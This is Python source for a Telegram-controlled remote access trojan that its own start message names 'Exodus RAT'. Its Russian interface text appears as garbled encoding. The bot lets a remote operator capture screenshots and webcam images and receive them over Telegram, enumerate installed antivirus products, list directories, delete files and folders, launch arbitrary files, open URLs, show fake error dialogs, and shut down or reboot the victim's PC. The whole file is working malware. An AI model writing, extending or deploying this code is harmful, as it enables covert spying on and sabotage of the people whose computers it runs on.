from data.modules import *
from config import TOKEN, USER_ID, bot_message, auto_tasks, bot

waiting_for_url = {}
waiting_for_path = {}
creating_folder = {}
removing_folder = {}
waiting_for_error = {}
waiting_for_file_upload  = {}
waiting_for_delete_path = {}
waiting_for_runfile = {}

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(USER_ID, "–ü—Ä–∏–≤–µ—Ç, —ç—Ç–æ Exodus RAT –¥–ª—è —Ç–µ–ª–µ–≥—Ä–∞–º–º–∞. –Ω–∞–ø–∏—à–∏—Ç–µ /help –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –∫–æ–º–º–∞–Ω–¥.")

def set_master_volume(level: float):
    pythoncom.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(level, None)

@bot.message_handler(commands=['help'])
def help(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = [
        KeyboardButton("C–∫—Ä–∏–Ω—à–æ—Ç"),
        KeyboardButton("–í–µ–±-–ö–∞–º–µ—Ä–∞"),
        KeyboardButton("–ê–Ω—Ç–∏–í–∏—Ä—É—Å—ã"),
        KeyboardButton("–û–∫—Ä—ã—Ç—å —Å–∞–π—Ç"),
        KeyboardButton("–°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏"),
        KeyboardButton("–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É"),
        KeyboardButton("–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É"),
        KeyboardButton("FakeError"),
        KeyboardButton("–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª"),
        KeyboardButton("–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª"),
        KeyboardButton("–ó–≤—É–∫ 100%"),
        KeyboardButton("–í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫"),
        KeyboardButton("–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö"),
        KeyboardButton("–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö"),
        KeyboardButton("ALT+F4"),
        KeyboardButton("–°–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ")
    ]
    markup.add(*buttons)
    bot.send_message(USER_ID, "—Å–Ω–∏–∑—É –µ—Å—Ç—å —Å–ø–∏—Å–æ–∫ –∫–æ–º–º–∞–Ω–¥", reply_markup=markup)


@bot.message_handler(func=lambda m: m.text == "–ó–≤—É–∫ 100%")
def vol_max(message):
    try:
        set_master_volume(1.0)
        bot.send_message(message.chat.id, "–ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ 100%")
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≥—Ä–æ–º–∫–æ—Å—Ç–∏: {e}")

@bot.message_handler(func=lambda m: m.text == "–í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫")
def vol_mute(message):
    try:
        set_master_volume(0.0)
        bot.send_message(message.chat.id, "–ó–≤—É–∫ –æ—Ç–∫–ª—é—á—ë–Ω")
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –∑–≤—É–∫–∞: {e}")

@bot.message_handler(func=lambda m: m.text == "–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö")
def shutdown_pc(message):
    bot.send_message(message.chat.id, "–í—ã–∫–ª—é—á–∞—é –ü–ö...")
    os.system("shutdown /s /t 0")

@bot.message_handler(func=lambda m: m.text == "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö")
def reboot_pc(message):
    bot.send_message(message.chat.id, "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞—é—Å—å...")
    os.system("shutdown /r /t 0")

@bot.message_handler(func=lambda m: m.text == "ALT+F4")
def alt_f4(message):
    bot.send_message(message.chat.id, "–í—ã–ø–æ–ª–Ω—è—é ALT+F4...")
    pyautogui.hotkey('alt', 'f4')

@bot.message_handler(func=lambda m: m.text == "–°–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ")
def minimize_all(message):
    bot.send_message(message.chat.id, "–°–≤–æ—Ä–∞—á–∏–≤–∞—é –≤—Å–µ –æ–∫–Ω–∞...")
    pyautogui.hotkey('win', 'd')

@bot.message_handler(func=lambda m: m.text == "–ê–Ω—Ç–∏–í–∏—Ä—É—Å—ã")
def antivirus_list(message):
    antivirus_list = []
    try:
        reg_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        for key in reg_keys:
            try:
                reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                for i in range(0, winreg.QueryInfoKey(reg)[0]):
                    subkey_name = winreg.EnumKey(reg, i)
                    subkey = winreg.OpenKey(reg, subkey_name)

                    try:
                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                        if "antivirus" in display_name.lower():
                            antivirus_list.append(display_name)
                    except FileNotFoundError:
                        continue

            except FileNotFoundError:
                continue
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
        return

    if antivirus_list:
        av_text = "\n".join(antivirus_list)
        bot.send_message(message.chat.id, f"–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã:\n{av_text}")
    else:
        bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã")


@bot.message_handler(func=lambda message: message.text == "C–∫—Ä–∏–Ω—à–æ—Ç")
def screenshot(message):
    bot.send_message(USER_ID, "–≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è...")

    temp_dir = "s"
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    file_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")

    try:
        screenshot_image = pyautogui.screenshot()
        screenshot_image.save(file_path)

        with open(file_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
    
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")
    
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)
            os.remove(temp_dir)


@bot.message_handler(func=lambda message: message.text == "–í–µ–±-–ö–∞–º–µ—Ä–∞")
def web(message):
    bot.send_message(USER_ID, "–≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è...")
    temp_dir = "s"
    os.makedirs(temp_dir, exist_ok=True)
    path = os.path.join(temp_dir, f"webcam_{int(time.time())}.png")

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –≤–µ–±-–∫–∞–º–µ—Ä—É.")
        return

    ret, frame = cap.read()
    cap.release()
    if not ret:
        bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–∞–¥—Ä —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.")
        return

    cv2.imwrite(path, frame)
    with open(path, 'rb') as f:
        bot.send_photo(message.chat.id, f)
    os.remove(path)
    os.remove(temp_dir)

@bot.message_handler(func=lambda message: message.text == "–û–∫—Ä—ã—Ç—å —Å–∞–π—Ç")
def site(message):
	waiting_for_url[message.chat.id] = True
	bot.send_message(USER_ID, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É")

@bot.message_handler(func=lambda message: waiting_for_url.get(message.chat.id, False))
def open_url(message):
    url = message.text.strip()

    # –û—á–∏—â–∞–µ–º —Ñ–ª–∞–≥
    waiting_for_url[message.chat.id] = False

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ –æ—Ç–∫—Ä—ã—Ç–∏–µ
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    try:
        webbrowser.open(url)
        bot.send_message(message.chat.id, f"–°–∞–π—Ç –æ—Ç–∫—Ä—ã—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ.")
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –æ—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç: {e}")

@bot.message_handler(func=lambda m: m.text == "–°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏")
def askpath(message):
    waiting_for_path[USER_ID] = True
    bot.send_message(USER_ID, "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–æ—Ç–æ—Ä–æ–π —Ö–æ—Ç–∏—Ç–µ –ø–æ–ª—É—á–∏—Ç—å:")

@bot.message_handler(func=lambda message: waiting_for_path.get(message.chat.id, False))
def directory_path(message):
    path = message.text.strip()

    waiting_for_path.pop(message.chat.id, None)

    if not os.path.exists(path):
        bot.send_message(message.chat.id, "‚ùå –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
        return

    if not os.path.isdir(path):
        bot.send_message(message.chat.id, "‚ùó –£–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–µ–π.")
        return

    files = os.listdir(path)
    if not files:
        bot.send_message(message.chat.id, "üìÇ –ü–∞–ø–∫–∞ –ø—É—Å—Ç–∞.")
        return

    reply = f"üìÅ –°–æ–¥–µ—Ä–∂–∏–º–æ–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏:\n\n"
    for item in files:
        full_path = os.path.join(path, item)
        if os.path.isdir(full_path):
            reply += f"üìÅ {item}/\n"
        else:
            reply += f"üìÑ {item}\n"

    max_len = 4000
    for i in range(0, len(reply), max_len):
        bot.send_message(message.chat.id, reply[i:i+max_len])


@bot.message_handler(func=lambda m: m.text == "–°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É")
def askname(message):
    creating_folder[USER_ID] = True
    bot.send_message(USER_ID, "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∏ –∏–º—è –Ω–æ–≤–æ–π –ø–∞–ø–∫–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä:\n`C:/Users/User/Desktop/NewFolder`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: creating_folder.get(message.chat.id, False))
def create_folder(message):
    path = message.text.strip()
    creating_folder.pop(message.chat.id, None)

    try:
        os.makedirs(path, exist_ok=False)
        bot.send_message(message.chat.id, f"‚úÖ –ü–∞–ø–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞:\n`{path}`", parse_mode="Markdown")
    except FileExistsError:
        bot.send_message(message.chat.id, "‚ö†Ô∏è –¢–∞–∫–∞—è –ø–∞–ø–∫–∞ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø–∞–ø–∫–∏:\n`{e}`", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "–£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É")
def ask_folder_to_delete(message):
    removing_folder[USER_ID] = True
    bot.send_message(USER_ID, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ, –∫–æ—Ç–æ—Ä—É—é –Ω—É–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å:")

@bot.message_handler(func=lambda message: removing_folder.get(message.chat.id, False))
def remove_folder(message):
    folder_path = message.text.strip()
    removing_folder.pop(message.chat.id, None)

    try:
        if os.path.exists(folder_path) and os.path.isdir(folder_path):
            os.rmdir(folder_path)
            bot.send_message(message.chat.id, f"‚úÖ –ü–∞–ø–∫–∞ —É–¥–∞–ª–µ–Ω–∞:\n`{folder_path}`", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "‚ùå –ü–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ —ç—Ç–æ –Ω–µ –ø–∞–ø–∫–∞.")
    except OSError as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏:\n`{e}`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "FakeError")
def askerror(message):
    waiting_for_error[USER_ID] = True
    bot.send_message(USER_ID, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ñ–µ–π–∫–æ–≤–æ–π –æ—à–∏–±–∫–∏, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å:")

@bot.message_handler(func=lambda message: waiting_for_error.get(message.chat.id, False))
def show_FakeError(message):
    error_text = message.text.strip()

    ctypes.windll.user32.MessageBoxW(0, error_text, "–û—à–∏–±–∫–∞", 0x10)  # MB_ICONERROR

    waiting_for_error[message.chat.id] = False

    bot.send_message(message.chat.id, "–§–µ–π–∫–æ–≤–∞—è –æ—à–∏–±–∫–∞ –ø–æ–∫–∞–∑–∞–Ω–∞.")

@bot.message_handler(func=lambda message: message.text == "–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª")
def delete_file_prompt(message):
    waiting_for_delete_path[USER_ID] = True
    bot.send_message(USER_ID, "–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å:")

@bot.message_handler(func=lambda message: waiting_for_delete_path.get(message.chat.id, False))
def delete_file_path(message):
    path = message.text.strip()

    try:
        if os.path.exists(path) and os.path.isfile(path):
            os.remove(path)
            bot.send_message(message.chat.id, "–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω.")
        else:
            bot.send_message(message.chat.id, "–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞: {e}")
    finally:
        waiting_for_delete_path[message.chat.id] = False

@bot.message_handler(func=lambda message: message.text == "–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª")
def prompt_run_file(message):
    waiting_for_runfile[USER_ID] = True
    bot.send_message(USER_ID, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å:")

@bot.message_handler(func=lambda message: waiting_for_runfile.get(message.chat.id, False))
def run_file(message):
    path = message.text.strip()
    waiting_for_runfile.pop(message.chat.id, None)

    if not os.path.exists(path):
        bot.send_message(message.chat.id, "‚ùå –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—É—Ç—å.")
        return
    if not os.path.isfile(path):
        bot.send_message(message.chat.id, "‚ùó –≠—Ç–æ –Ω–µ —Ñ–∞–π–ª.")
        return

    try:
        if os.name == 'nt':
            os.startfile(path)
        else:
            subprocess.Popen(['xdg-open', path])
        bot.send_message(message.chat.id, f"‚úÖ –§–∞–π–ª –∑–∞–ø—É—â–µ–Ω:\n`{path}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ —Ñ–∞–π–ª–∞:\n`{e}`", parse_mode="Markdown")

if __name__ == '__main__':
    bot.polling(none_stop=True)